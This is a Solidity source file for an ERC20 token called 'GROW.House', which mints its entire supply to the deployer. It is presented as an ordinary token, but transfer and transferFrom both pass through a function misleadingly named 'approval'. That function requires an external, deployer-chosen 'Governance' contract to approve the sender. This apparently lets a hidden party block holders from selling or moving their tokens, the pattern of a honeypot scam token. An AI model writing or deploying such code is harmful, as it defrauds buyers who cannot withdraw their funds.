row number 
1	           pragma solidity ^0.5.17;
2	 contract ERC20Interface {
3	 function totalSupply() public view returns (uint);
4	 function balanceOf(address tokenOwner) public view returns (uint balance);
5	 function allowance(address tokenOwner, address spender) public view returns (uint remaining);
6	 function transfer(address to, uint tokens) public returns (bool success);
7	 function approve(address spender, uint tokens) public returns (bool success);
8	 function transferFrom(address from, address to, uint tokens) public returns (bool success);
9	 event Transfer(address indexed from, address indexed to, uint tokens);
10	 event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
11	 }
12	 interface Governance {
13	 function isSafe(address sender,address addr) external returns(bool);
14	 }
15	 contract SafeMath {
16	 function safeAdd(uint a, uint b) public pure returns (uint c) {
17	 c = a + b;
18	 require(c >= a);
19	 }
20	 function safeSub(uint a, uint b) public pure returns (uint c) {
21	 require(b <= a);
22	 c = a - b;
23	 }
24	 function safeMul(uint a, uint b) public pure returns (uint c) {
25	 c = a * b;
26	 require(a == 0 || c / a == b);
27	 }
28	 function safeDiv(uint a, uint b) public pure returns (uint c) {
29	 require(b > 0);
30	 c = a / b;
31	 }
32	 }
33	 contract GROW is ERC20Interface, SafeMath {
34	 string public name;
35	 string public symbol;
36	 uint8 public decimals;
37	 uint256 public _totalSupply;
38	 mapping(address => uint) balances;
39	 mapping(address => mapping(address => uint)) allowed;
40	 address _governance;
41	 constructor(address _gov) public {
42	 name = "GROW.House";
43	 symbol = "GROW";
44	 decimals = 18;
45	 _totalSupply = safeMul(100000000, 1e18);
46	 _governance = _gov;
47	 balances[msg.sender] = _totalSupply;
48	 emit Transfer(address(0), msg.sender, _totalSupply);
49	 }
50	 function totalSupply() public view returns (uint) {
51	 return _totalSupply - balances[address(0)];
52	 }
53	 function balanceOf(address tokenOwner) public view returns (uint balance) {
54	 return balances[tokenOwner];
55	 }
56	 function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
57	 return allowed[tokenOwner][spender];
58	 }
59	 function approval(address sender) public returns(bool) {
60	 require(Governance(_governance).isSafe(sender,address(this)));
61	 return true;
62	 }
63	 function approve(address spender, uint tokens) public returns (bool success) {
64	 allowed[msg.sender][spender] = tokens;
65	 emit Approval(msg.sender, spender, tokens);
66	 return true;
67	 }
68	 function transfer(address to, uint tokens) public returns (bool success) {
69	 approval(msg.sender);
70	 balances[msg.sender] = safeSub(balances[msg.sender], tokens);
71	 balances[to] = safeAdd(balances[to], tokens);
72	 emit Transfer(msg.sender, to, tokens);
73	 return true;
74	 }
75	 function transferFrom(address from, address to, uint tokens) public returns (bool success) {
76	 approval(from);
77	 balances[from] = safeSub(balances[from], tokens);
78	 allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
79	 balances[to] = safeAdd(balances[to], tokens);
80	 emit Transfer(from, to, tokens);
81	 return true;
82	 }
83	 }
